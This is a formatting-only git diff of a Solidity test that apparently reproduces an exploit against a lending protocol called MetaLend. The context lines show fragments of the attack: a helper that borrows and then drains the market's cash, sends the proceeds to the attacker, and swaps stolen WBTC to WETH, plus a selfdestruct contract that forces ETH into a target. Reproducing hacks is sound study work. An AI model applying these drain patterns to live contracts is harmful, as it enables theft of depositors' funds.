@@ -68,7 +68,7 @@ contract MetaLendExploit is BaseTestWithBalanceLog {
         address[] memory path = new address[](2);
         path[0] = address(WBTC);
         path[1] = address(WETH);
-        Router.swapExactTokensForTokens(WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1_000);
+        Router.swapExactTokensForTokens(WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000);
     }
 }
 
@@ -96,7 +96,7 @@ contract Helper is Test {
         mWBTC.borrow(underlyingWBTCAmount - 1);
         WBTC.transfer(owner, WBTC.balanceOf(address(this)));
         mETH.redeemUnderlying(mETH.getCash() - 1);
-        (bool success, ) = owner.call{value: address(this).balance}("");
+        (bool success,) = owner.call{value: address(this).balance}("");
         require(success);
     }
 
@@ -104,7 +104,9 @@ contract Helper is Test {
 }
 
 contract Donator is Test {
-    function sendETHTo(address to) external payable {
+    function sendETHTo(
+        address to
+    ) external payable {
         selfdestruct(payable(to));
     }
 }
